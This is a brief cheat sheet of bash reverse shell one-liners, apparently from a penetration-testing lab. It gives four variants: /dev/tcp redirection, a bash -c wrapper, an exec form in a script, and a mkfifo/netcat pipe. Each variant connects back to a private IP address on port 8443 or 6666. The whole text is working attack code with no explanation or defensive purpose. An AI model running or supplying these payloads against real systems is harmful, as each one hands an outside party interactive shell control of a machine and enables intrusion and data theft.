# Reverse Shell in Bash script
bash -i >& /dev/tcp/192.168.45.171/8443 0>&1

# One-liner bash command
bash -c "bash -i >& /dev/tcp/192.168.45.182/6666 0>&1"

# Try this before if above cant works
#!/bin/bash
/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.45.182/6666 0>&1'

# Another one-liner reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.182 6666 >/tmp/f
